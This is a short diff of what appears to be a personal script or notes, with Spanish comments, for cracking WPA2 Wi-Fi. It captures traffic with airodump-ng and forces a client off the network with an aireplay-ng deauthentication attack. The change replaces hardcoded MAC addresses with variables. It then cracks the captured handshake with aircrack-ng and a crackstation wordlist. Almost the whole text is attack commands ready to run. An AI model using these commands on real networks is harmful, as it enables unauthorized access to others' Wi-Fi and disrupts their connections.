@@ -31,7 +31,7 @@ sudo airodump-ng wlan0
 sudo airodump-ng -c 4 --bssid 04:FE:8D:76:5B:88 -w wpa2 wlan0   
 
 //Deautenticación
-sudo aireplay-ng -0 10 -a "04:FE:8D:76:5B:88" -c "9C:5A:81:EA:D9:5E" wlan0
+sudo aireplay-ng -0 10 -a $bssid -c $cliente wlan0
 
 //Crackeo de handshake
 sudo aircrack-ng -0 -w Documents/crackstation.txt wpa2-01.cap
